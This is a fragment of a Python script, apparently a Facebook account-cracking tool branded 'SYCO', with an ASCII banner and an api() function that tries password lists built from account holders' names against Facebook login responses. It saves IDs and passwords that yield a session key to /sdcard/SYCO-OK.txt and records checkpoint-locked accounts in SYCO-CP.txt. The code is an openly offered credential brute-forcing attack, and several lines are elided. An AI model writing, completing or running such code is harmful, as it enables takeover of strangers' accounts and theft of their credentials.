...
$$\   $$ |   $$ |    $$ |  $$\ $$ |  $$ |
\$$$$$$  |   $$ |    \$$$$$$  | $$$$$$  |
 \______/    \__|     \______/  \______/ \033[;37m  
----------------------------------------------------------------
  Owner    :    Mr Syco x Shona
  Github   :    https://github.com/SYCO_ID
  Version  :    0.1  
----------------------------------------------------------------""")
...
def api(ids,names,passlist): 
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [SYCO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [SYCO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SYCO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [SYCO-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/SYCO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
